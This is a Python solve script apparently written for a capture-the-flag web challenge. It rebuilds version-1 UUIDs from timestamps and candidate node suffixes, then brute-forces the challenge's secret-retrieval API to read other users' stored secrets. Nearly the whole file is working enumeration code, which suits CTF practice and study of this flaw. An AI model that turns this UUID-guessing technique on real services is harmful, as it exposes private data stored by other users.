import os
import math
import requests
import uuid
import time_uuid
import decimal

from requests.models import RequestEncodingMixin

TARGET_URL = 'https://web-secret-bin-beabf0f8.chal-2021.duc.tf'
def getHexFromTimestamp(t):
    d = decimal.Decimal(str(t))
    a=d.as_tuple().exponent
    t=int(t*10000000)
    t=t+122192928000000000
    if a < (-6):
        t=t+1
    t=format(t,'x')
    return t

def getUuid(t,n):
    part3='1'+t[0:3]
    part2=t[3:7]
    part1=t[7:]
    
    test=[]
    uuid=part1+'-'+part2+'-'+part3

    for i in n:
        test.append(uuid+'-'+i)

    return test

def getNumber():
    res=requests.get(f'{TARGET_URL}/api/stats')
    res=res.json()
    #print(res.get('stats').get('total_secret_count'))
    res=requests.post(f'{TARGET_URL}/api/secret')
    #print(res.text)
    n=res.text[-17:]
    res=requests.get(f'{TARGET_URL}/api/stats')
    res=res.json()
    #print(res.get('stats').get('total_secret_count'))
    return n

#getHexFromTimestamp(1632593085.895038)

nodes=['8421-00155d1c46cb','880f-000d3acaef36','8b1e-0401b7194601','bb4c-0050568f00a9']

test=[1627995373.4724479,1627995373.480319,1627995373.4814053,1627995373.4826362,1627995373.4835217,1627995373.484459,1627995373.4851954,1627995373.4860694,1627995373.486915,1627995373.4881246,1627995373.489087,1627995373.4899764,1627995373.4908245,1627995373.4916098,1627995373.4924026,1627995373.4932659,1627995373.4940598,1627995373.4949121,1627995373.4957838,1627995373.496963,1627995373.4977782,1627995373.498554,1627995373.4996996,1627995373.5006378,1627995373.501489,1627995373.5021966,1627995373.5030887,1627995373.5040665,1627995373.5048673,1627995373.5056486,1627995373.5065925,1627995373.507656]
#print(len(test))
#my_uuid = uuid.UUID('{28e656fd-1e3a-11ec-8b1e-0401b7194601}')
#ts = time_uuid.TimeUUID(bytes=my_uuid.bytes).get_timestamp()
#print(ts)
#t=getHexFromTimestamp(ts)
#t=getUuid(t,nodes)
#print(t)
j=0 
for t in test:
    t=getHexFromTimestamp(t)
    print(f"timestamp {j} - {t}")
    t=getUuid(t,nodes)
    #print(t)
    j+=1
    for i in t:
        #print(i)
        res=requests.get(f"{TARGET_URL}/api/secret/{i}")
        if res.text:
            print(res.text)
